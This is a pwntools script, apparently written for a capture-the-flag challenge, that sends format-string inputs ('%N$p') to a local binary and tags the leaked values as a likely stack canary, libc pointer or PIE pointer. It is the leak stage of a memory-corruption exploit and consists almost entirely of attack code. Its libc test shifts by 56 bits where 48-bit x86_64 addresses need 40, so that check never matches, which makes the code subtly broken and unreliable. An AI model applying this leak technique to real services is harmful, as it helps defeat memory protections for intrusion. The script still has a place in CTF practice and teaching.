from pwn import *

context.binary = elf = ELF("./chal", checksec=False)
libc = ELF("./libc.so.6", checksec=False)
context.log_level = "error"

def run_once(fmt: bytes) -> bytes:
    # Force your provided ld + libc for matching behavior
    io = process(["./ld-linux-x86-64.so.2", "--library-path", ".", "./chal"])
    io.recvuntil(b"What is your favourite pokemon?\n")
    io.sendline(fmt)
    io.recvuntil(b"I see you like...\n")
    out = io.recvline().strip()
    io.close()
    return out

def looks_canary(x: int) -> bool:
    # stack canary on x86_64 almost always ends with 0x00 byte
    return (x & 0xff) == 0

def main():
    # Try offsets 1..40 and look for likely canary/libc/pie pointers
    for i in range(1, 41):
        fmt = f"%{i}$p".encode()
        out = run_once(fmt)
        if not out.startswith(b"0x"):
            continue
        val = int(out, 16)

        tag = []
        if (val >> 56) == 0x7f:
            tag.append("LIBC/LD?")
        if (val >> 40) == 0x55:
            tag.append("PIE?")
        if looks_canary(val) and val != 0:
            tag.append("CANARY?")

        if tag:
            print(f"{i:2d} -> {out.decode()}   {' '.join(tag)}")

if __name__ == "__main__":
    main()
